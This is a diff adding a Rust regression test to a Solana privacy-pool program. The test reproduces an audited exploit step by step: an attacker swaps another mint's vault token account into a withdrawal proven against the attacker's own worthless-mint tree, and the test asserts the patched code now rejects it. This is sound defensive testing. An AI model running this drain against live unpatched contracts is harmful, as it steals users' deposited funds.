@@ -28,7 +28,10 @@ use ethers::{
 };
 use light_hasher::zero_bytes::poseidon::ZERO_BYTES;
 use litesvm::LiteSVM;
-use litesvm_token::{CreateAssociatedTokenAccount, CreateMint, MintTo, TOKEN_ID};
+use litesvm_token::{
+    CreateAssociatedTokenAccount, CreateAssociatedTokenAccountIdempotent, CreateMint, MintTo,
+    TOKEN_ID,
+};
 use num_bigint::{BigInt, BigUint, ToBigUint};
 use num_traits::ToPrimitive;
 use privacy_cash::{
@@ -6996,4 +6999,508 @@ fn spl_withdrawal_has_no_limits() {
     let expected_change =
         deposit_amount - calculated_deposit_fee - withdrawn_amount - calculated_withdraw_fee;
     assert_eq!(withdraw_outputs[0].amount, expected_change);
+}
+
+// -----------------------------------------------------------------------------
+// Security finding reproducer: cross-mint `tree_ata` substitution
+// (.qed/findings/audit-20260814T150536Z.md, finding 1)
+//
+// `process_transact_spl` only ever checks that `tree_ata` matches `mint` on
+// the deposit branch (via `CreateIdempotent`, which the ATA program validates
+// internally). On withdrawal / fee payment, `tree_ata` is trusted as-is and
+// `global_config` is the shared SPL-vault authority for every mint's tree, so
+// an attacker can prove a withdrawal against a tree for a mint they fully
+// control (free, self-minted supply) while substituting a DIFFERENT mint's
+// real vault ATA as `tree_ata` -- draining it.
+// -----------------------------------------------------------------------------
+#[test]
+fn security_finding_cross_mint_tree_ata_drain() {
+    let mut ctx = setup();
+
+    // Attacker needs SOL to pay for their own mint / tree / nullifier rent
+    // across two real transactions.
+    ctx.svm
+        .airdrop(&ctx.attacker.pubkey(), 5 * LAMPORTS_PER_SOL)
+        .unwrap();
+
+    // ---------------------------------------------------------------------
+    // Simulate a real, pre-existing balance in the victim vault
+    // (ctx.spl_tree_token_account, the REAL mint's tree ATA) -- equivalent
+    // to funds already deposited by honest users. Funded directly (rather
+    // than via a full deposit+proof) since the vulnerability is entirely on
+    // the withdrawal side; how the vault got its balance is immaterial.
+    // ---------------------------------------------------------------------
+    let victim_vault_funds: u64 = 1_000_000;
+    let created_vault_ata = CreateAssociatedTokenAccountIdempotent::new(
+        &mut ctx.svm,
+        &ctx.authority,
+        &ctx.spl_token_mint,
+    )
+    .owner(&ctx.global_config)
+    .send()
+    .expect("failed to create victim vault ATA");
+    assert_eq!(created_vault_ata, ctx.spl_tree_token_account);
+
+    MintTo::new(
+        &mut ctx.svm,
+        &ctx.authority,
+        &ctx.spl_token_mint,
+        &ctx.spl_tree_token_account,
+        victim_vault_funds,
+    )
+    .send()
+    .expect("failed to fund victim vault");
+
+    assert_eq!(
+        get_token_account_state(&mut ctx.svm, &ctx.spl_tree_token_account).amount,
+        victim_vault_funds
+    );
+
+    // ---------------------------------------------------------------------
+    // Attacker creates and fully controls their own worthless mint, and a
+    // tree for it. Permissionless per the current deployed config:
+    // ADMIN_PUBKEY = None, ALLOW_ALL_SPL_TOKENS = true (src/constants.rs).
+    // ---------------------------------------------------------------------
+    let attacker_mint = CreateMint::new(&mut ctx.svm, &ctx.attacker)
+        .authority(&ctx.attacker.pubkey())
+        .freeze_authority(&ctx.attacker.pubkey())
+        .decimals(6)
+        .send()
+        .expect("attacker mint creation failed");
+
+    let (attacker_tree_account, attacker_tree_bump) = Address::derive_program_address(
+        &[b"merkle_tree", attacker_mint.as_array()],
+        &Address::from_str_const(PROGRAM_ID),
+    )
+    .expect("attacker tree PDA derivation failed");
+
+    let init_attacker_tree_ix = build_initialize_for_spl_ix(
+        Pubkey::from_str(PROGRAM_ID).unwrap(),
+        ctx.attacker.pubkey(),
+        attacker_tree_account,
+        attacker_mint,
+        ctx.global_config,
+        attacker_tree_bump,
+        50_000_000_000_000,
+    );
+    let init_attacker_tree_tx = Transaction::new_signed_with_payer(
+        &[init_attacker_tree_ix],
+        Some(&ctx.attacker.pubkey()),
+        &[&ctx.attacker],
+        ctx.svm.latest_blockhash(),
+    );
+    ctx.svm
+        .send_transaction(init_attacker_tree_tx)
+        .expect("attacker tree init should succeed -- permissionless per current config");
+
+    let attacker_mint_ata =
+        CreateAssociatedTokenAccount::new(&mut ctx.svm, &ctx.attacker, &attacker_mint)
+            .send()
+            .expect("attacker mint ATA creation failed");
+
+    // Free, unlimited supply -- attacker is their own mint authority.
+    let attacker_supply: u64 = 100_000_000_000;
+    MintTo::new(
+        &mut ctx.svm,
+        &ctx.attacker,
+        &attacker_mint,
+        &attacker_mint_ata,
+        attacker_supply,
+    )
+    .send()
+    .expect("attacker self-mint failed");
+
+    let attacker_tree_ata = get_associated_token_address(&ctx.global_config, &attacker_mint);
+    let attacker_fee_recipient_ata =
+        CreateAssociatedTokenAccount::new(&mut ctx.svm, &ctx.fee_recipient, &attacker_mint)
+            .send()
+            .expect("attacker-mint fee recipient ATA creation failed");
+
+    let mut attacker_merkle_tree = MerkleTree::new(DEFAULT_HEIGHT, Vec::new());
+
+    // ---------------------------------------------------------------------
+    // Attacker deposits into their own tree -- the normal, correctly gated
+    // deposit path (CreateIdempotent checks tree_ata == ATA(global_config,
+    // attacker_mint)).
+    // ---------------------------------------------------------------------
+    let deposit_amount: u64 = 10_000_000;
+    let calculated_deposit_fee = calculate_deposit_fee(deposit_amount);
+
+    let deposit_ext_data = ExtData {
+        recipient: attacker_mint_ata.to_bytes(),
+        ext_amount: i64::try_from(deposit_amount).unwrap(),
+        encrypted_output1: b"attackerDepositOutput1".to_vec(),
+        encrypted_output2: b"attackerDepositOutput2".to_vec(),
+        fee: calculated_deposit_fee,
+        fee_recipient: attacker_fee_recipient_ata.to_bytes(),
+        mint_address: *attacker_mint.as_array(),
+    };
+
+    let deposit_inputs = [
+        Utxo::with_mint(0, attacker_mint),
+        Utxo::with_mint(0, attacker_mint),
+    ];
+
+    let field_size = BigInt::from_str(FIELD_SIZE_DECIMAL).unwrap();
+    let ext_amount = BigInt::from(deposit_ext_data.ext_amount);
+    let deposit_fee = BigInt::from(calculated_deposit_fee);
+    let public_amount_number = (ext_amount - deposit_fee + &field_size) % &field_size;
+
+    let output_index = attacker_merkle_tree.elements().len() as u64;
+    let deposit_outputs = [
+        Utxo::new_with_mint(
+            public_amount_number
+                .clone()
+                .try_into()
+                .expect("public amount should fit in u64"),
+            attacker_mint,
+        )
+        .with_index(output_index),
+        Utxo::new_with_mint(0, attacker_mint),
+    ];
+
+    let deposit_input_nullifiers = [
+        deposit_inputs[0].get_nullifier().unwrap(),
+        deposit_inputs[1].get_nullifier().unwrap(),
+    ];
+    let deposit_output_commitments = [
+        deposit_outputs[0]
+            .get_commitment()
+            .expect("failed to compute output commitment"),
+        deposit_outputs[1]
+            .get_commitment()
+            .expect("failed to compute output commitment"),
+    ];
+
+    let deposit_root = attacker_merkle_tree.root();
+    let deposit_ext_data_hash = get_ext_data_hash(&deposit_ext_data);
+
+    let deposit_input = ProofInput {
+        root: deposit_root,
+        input_nullifier: deposit_input_nullifiers,
+        output_commitment: deposit_output_commitments,
+        public_amount: public_amount_number
+            .clone()
+            .to_biguint()
+            .expect("public amount should be non-negative"),
+        ext_data_hash: deposit_ext_data_hash,
+        in_amount: deposit_inputs
+            .iter()
+            .map(|x| BigUint::from(x.amount))
+            .collect(),
+        in_private_key: deposit_inputs
+            .iter()
+            .map(|x| x.keypair.privkey.clone())
+            .collect(),
+        in_blinding: deposit_inputs
+            .iter()
+            .map(|x| BigUint::from(x.blinding.clone()))
+            .collect(),
+        mint_address: deposit_inputs[0].mint_address.to_string(),
+        in_path_indices: [0usize; 2],
+        in_path_elements: vec![
+            vec![[0u8; 32]; attacker_merkle_tree.levels],
+            vec![[0u8; 32]; attacker_merkle_tree.levels],
+        ],
+        out_amount: deposit_outputs
+            .iter()
+            .map(|x| BigUint::from(x.amount))
+            .collect(),
+        out_blinding: deposit_outputs
+            .iter()
+            .map(|x| BigUint::from(x.blinding.clone()))
+            .collect(),
+        out_pubkey: deposit_outputs
+            .iter()
+            .map(|x| x.keypair.pubkey.clone())
+            .collect(),
+    };
+
+    let key_base_path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+        .join("artifacts")
+        .join("circuits")
+        .join("transaction2");
+
+    let deposit_proof_result = prove(&deposit_input, &key_base_path).unwrap();
+    let deposit_proof_to_submit =
+        format_proof(deposit_artifacts_to_submit(&deposit_proof_result, false).unwrap());
+
+    let deposit_nullifiers = find_nullifier_pdas(
+        &Pubkey::from_str_const(PROGRAM_ID),
+        &deposit_proof_to_submit,
+    );
+    let deposit_cross_check_nullifiers = find_cross_check_nullifier_pdas(
+        &Pubkey::from_str_const(PROGRAM_ID),
+        &deposit_proof_to_submit,
+    );
+
+    let modify_compute_units = ComputeBudgetInstruction::set_compute_unit_limit(1_000_000);
+
+    let deposit_protocol_addresses = get_test_protocol_addresses_with_mint(
+        &Address::from_str_const(PROGRAM_ID),
+        &ctx.authority.pubkey(),
+        &attacker_tree_ata,
+        &ctx.fee_recipient.pubkey(),
+        &attacker_fee_recipient_ata,
+        &attacker_tree_account,
+        &attacker_mint,
+    );
+    let deposit_alt = create_global_test_alt(
+        &mut ctx.svm,
+        &ctx.authority,
+        &ctx.authority,
+        &deposit_protocol_addresses,
+    );
+
+    advance_one_slot(&mut ctx.svm);
+
+    let deposit_ix = build_transact_spl_ix(
+        Pubkey::from_str_const(PROGRAM_ID),
+        &deposit_proof_to_submit,
+        &create_ext_data_minified(&deposit_ext_data),
+        &deposit_ext_data.encrypted_output1,
+        &deposit_ext_data.encrypted_output2,
+        deposit_nullifiers.bump0,
+        deposit_nullifiers.bump1,
+        attacker_tree_account,
+        deposit_nullifiers.nullifier0,
+        deposit_nullifiers.nullifier1,
+        deposit_cross_check_nullifiers.0,
+        deposit_cross_check_nullifiers.1,
+        ctx.global_config,
+        ctx.attacker.pubkey(),
+        attacker_mint,
+        attacker_mint_ata,
+        ctx.attacker.pubkey(),
+        attacker_mint_ata,
+        attacker_tree_ata,
+        attacker_fee_recipient_ata,
+    );
+
+    let deposit_tx = create_versioned_tx_with_alt(
+        &mut ctx.svm,
+        &ctx.attacker,
+        &[],
+        &[modify_compute_units.clone(), deposit_ix],
+        &deposit_alt,
+    );
+
+    ctx.svm
+        .send_transaction(deposit_tx)
+        .expect("attacker's own deposit into their own tree should succeed");
+
+    for commitment in deposit_output_commitments {
+        attacker_merkle_tree.insert(commitment);
+    }
+
+    // ---------------------------------------------------------------------
+    // THE ATTACK: withdraw against the attacker's own tree/nullifiers (the
+    // only tree the proof is actually valid against), but substitute the
+    // REAL victim vault as `spl_tree_ata` and the attacker's real-mint ATA
+    // as `recipient_ata`.
+    // ---------------------------------------------------------------------
+    let withdraw_amount: u64 = 900_000; // > anything the attacker ever put into the victim mint's tree
+    let calculated_withdraw_fee = calculate_withdrawal_fee(withdraw_amount);
+
+    let withdraw_ext_amount = BigInt::from(calculated_withdraw_fee) - BigInt::from(withdraw_amount);
+    let withdraw_public_number =
+        (&withdraw_ext_amount - BigInt::from(calculated_withdraw_fee) + &field_size) % &field_size;
+
+    let withdraw_ext_data = ExtData {
+        recipient: ctx.attacker_ata.to_bytes(), // attacker's REAL (victim-mint) token account
+        ext_amount: i64::try_from(withdraw_ext_amount).unwrap(),
+        encrypted_output1: b"attackerWithdrawOutput1".to_vec(),
+        encrypted_output2: b"attackerWithdrawOutput2".to_vec(),
+        fee: calculated_withdraw_fee,
+        fee_recipient: ctx.fee_recipient_ata.to_bytes(), // must be victim-mint denominated
+        mint_address: *attacker_mint.as_array(), // self-consistent with the `mint` account -- unrelated to which vault actually gets drained
+    };
+
+    let withdraw_inputs = [
+        deposit_outputs[0].clone(),
+        Utxo::new_with_mint(0, attacker_mint),
+    ];
+
+    let change_number = (deposit_amount
+        - calculated_deposit_fee
+        - (withdraw_ext_data.ext_amount.abs() as u64)
+        - calculated_withdraw_fee
+        + &field_size)
+        % &field_size;
+
+    let withdraw_outputs = [
+        Utxo::new_with_mint(
+            change_number
+                .clone()
+                .try_into()
+                .expect("public amount should fit in u64"),
+            attacker_mint,
+        ),
+        Utxo::new_with_mint(0, attacker_mint),
+    ];
+
+    let mut withdraw_input_merkle_path_indices = [0usize; 2];
+    let mut withdraw_input_merkle_path_elements = vec![
+        vec![[0u8; 32]; attacker_merkle_tree.levels],
+        vec![[0u8; 32]; attacker_merkle_tree.levels],
+    ];
+    for (index, note) in withdraw_inputs.iter().enumerate() {
+        if note.amount > 0 {
+            let output_commitment = note.get_commitment().unwrap();
+            let note_index = attacker_merkle_tree.index_of(&output_commitment);
+            assert!(note_index >= 0, "attacker's own deposit note must be found");
+            withdraw_input_merkle_path_indices[index] = note_index as usize;
+            withdraw_input_merkle_path_elements[index] =
+                attacker_merkle_tree.path(note_index as usize).path_elements;
+        }
+    }
+
+    let withdraw_input_nullifiers = [
+        withdraw_inputs[0].get_nullifier().unwrap(),
+        withdraw_inputs[1].get_nullifier().unwrap(),
+    ];
+    let withdraw_output_commitments = [
+        withdraw_outputs[0]
+            .get_commitment()
+            .expect("failed to compute output commitment"),
+        withdraw_outputs[1]
+            .get_commitment()
+            .expect("failed to compute output commitment"),
+    ];
+
+    let withdraw_root = attacker_merkle_tree.root();
+    let withdraw_ext_data_hash = get_ext_data_hash(&withdraw_ext_data);
+
+    let withdraw_input = ProofInput {
+        root: withdraw_root,
+        input_nullifier: withdraw_input_nullifiers,
+        output_commitment: withdraw_output_commitments,
+        public_amount: withdraw_public_number
+            .clone()
+            .to_biguint()
+            .expect("public amount should be non-negative"),
+        ext_data_hash: withdraw_ext_data_hash,
+        in_amount: withdraw_inputs
+            .iter()
+            .map(|x| BigUint::from(x.amount))
+            .collect(),
+        in_private_key: withdraw_inputs
+            .iter()
+            .map(|x| x.keypair.privkey.clone())
+            .collect(),
+        in_blinding: withdraw_inputs
+            .iter()
+            .map(|x| BigUint::from(x.blinding.clone()))
+            .collect(),
+        mint_address: withdraw_inputs[0].mint_address.to_string(),
+        in_path_indices: withdraw_input_merkle_path_indices,
+        in_path_elements: withdraw_input_merkle_path_elements,
+        out_amount: withdraw_outputs
+            .iter()
+            .map(|x| BigUint::from(x.amount))
+            .collect(),
+        out_blinding: withdraw_outputs
+            .iter()
+            .map(|x| BigUint::from(x.blinding.clone()))
+            .collect(),
+        out_pubkey: withdraw_outputs
+            .iter()
+            .map(|x| x.keypair.pubkey.clone())
+            .collect(),
+    };
+
+    let withdraw_proof_result = prove(&withdraw_input, &key_base_path).unwrap();
+    let withdraw_proof_to_submit =
+        format_proof(deposit_artifacts_to_submit(&withdraw_proof_result, false).unwrap());
+
+    let withdraw_nullifiers = find_nullifier_pdas(
+        &Pubkey::from_str_const(PROGRAM_ID),
+        &withdraw_proof_to_submit,
+    );
+    let withdraw_cross_check_nullifiers = find_cross_check_nullifier_pdas(
+        &Pubkey::from_str_const(PROGRAM_ID),
+        &withdraw_proof_to_submit,
+    );
+
+    // Reuse the deposit's already-created ALT (attacker_tree_account,
+    // attacker_mint, global_config, program id, etc. are all already in
+    // it). The handful of addresses it *doesn't* cover -- the real victim
+    // vault, the real fee-recipient ATA, and the attacker's real-mint ATA
+    // -- simply ride along as static account keys in the v0 message
+    // instead of being looked up via the ALT; `try_compile` handles that
+    // automatically. Creating a genuinely separate second ALT mid-test hit
+    // an unrelated "not a recent slot" fragility in this harness's
+    // `create_global_test_alt` (untested path: no existing test creates
+    // two distinct ALTs in one test), so this sidesteps that rather than
+    // debugging test-harness plumbing unrelated to the finding.
+    let attack_alt = deposit_alt;
+
+    advance_one_slot(&mut ctx.svm);
+
+    let attack_ix = build_transact_spl_ix(
+        Pubkey::from_str_const(PROGRAM_ID),
+        &withdraw_proof_to_submit,
+        &create_ext_data_minified(&withdraw_ext_data),
+        &withdraw_ext_data.encrypted_output1,
+        &withdraw_ext_data.encrypted_output2,
+        withdraw_nullifiers.bump0,
+        withdraw_nullifiers.bump1,
+        attacker_tree_account, // tree_account: still the attacker's own (MINT_B) tree state
+        withdraw_nullifiers.nullifier0,
+        withdraw_nullifiers.nullifier1,
+        withdraw_cross_check_nullifiers.0,
+        withdraw_cross_check_nullifiers.1,
+        ctx.global_config,
+        ctx.attacker.pubkey(),
+        attacker_mint, // mint: attacker's own worthless mint
+        attacker_mint_ata, // signer_ata: attacker's own ATA, mint-checked
+        ctx.attacker.pubkey(), // recipient: unused wallet slot
+        ctx.attacker_ata, // recipient_ata: attacker's REAL victim-mint account -- SWAPPED
+        ctx.spl_tree_token_account, // spl_tree_ata: the REAL victim vault -- SWAPPED
+        ctx.fee_recipient_ata, // fee_recipient_ata: real victim-mint fee account
+    );
+
+    let vault_before = get_token_account_state(&mut ctx.svm, &ctx.spl_tree_token_account).amount;
+    let attacker_real_ata_before = get_token_account_state(&mut ctx.svm, &ctx.attacker_ata).amount;
+
+    let attack_tx = create_versioned_tx_with_alt(
+        &mut ctx.svm,
+        &ctx.attacker,
+        &[],
+        &[modify_compute_units, attack_ix],
+        &attack_alt,
+    );
+
+    // Regression guard for the fix: `tree_ata` is now checked against `mint`
+    // on every path (src/instructions/transact_spl.rs), not just the
+    // deposit branch's `CreateIdempotent` call, so this cross-mint
+    // substitution must now be rejected with `InvalidMintAddress` and the
+    // real vault must be left untouched.
+    //
+    // (Verified against the pre-fix code first: with the `tree_ata` mint
+    // check removed, this exact transaction succeeds and drains
+    // `withdraw_amount` raw units from `ctx.spl_tree_token_account` into
+    // `ctx.attacker_ata` -- see .qed/findings/audit-20260814T150536Z.md,
+    // finding 1.)
+    let err = ctx
+        .svm
+        .send_transaction(attack_tx)
+        .expect_err("cross-mint tree_ata substitution must be rejected after the fix");
+    let logs = err.meta.logs.join("\n");
+    assert!(
+        logs.contains("InvalidMintAddress") || logs.contains("0x1"),
+        "expected InvalidMintAddress, got: {logs}"
+    );
+
+    let vault_after = get_token_account_state(&mut ctx.svm, &ctx.spl_tree_token_account).amount;
+    let attacker_real_ata_after = get_token_account_state(&mut ctx.svm, &ctx.attacker_ata).amount;
+
+    assert_eq!(
+        vault_after, vault_before,
+        "the real victim vault must be untouched"
+    );
+    assert_eq!(
+        attacker_real_ata_after, attacker_real_ata_before,
+        "the attacker must receive nothing"
+    );
 }
